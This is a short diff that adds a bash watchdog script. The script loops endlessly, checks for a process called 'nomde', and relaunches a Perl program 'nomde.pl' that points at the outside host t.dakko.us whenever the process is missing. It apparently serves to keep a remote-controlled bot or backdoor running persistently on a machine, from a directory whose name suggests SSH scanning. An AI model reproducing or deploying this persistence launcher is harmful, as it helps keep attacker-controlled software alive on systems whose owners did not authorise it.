@@ -1,0 +1,12 @@
+#!/bin/bash
+echo "Starting..."
+cd sshns
+while [ 1 ]; do
+ ps -ef | grep -v grep | grep nomde
+ if [ $? -eq 1 ]
+  then
+  ./nomde.pl -i 127.0.0.1 t.dakko.us #> /dev/null
+ else
+  echo .eq 0 - daemon found - do nothing.
+ fi
+done
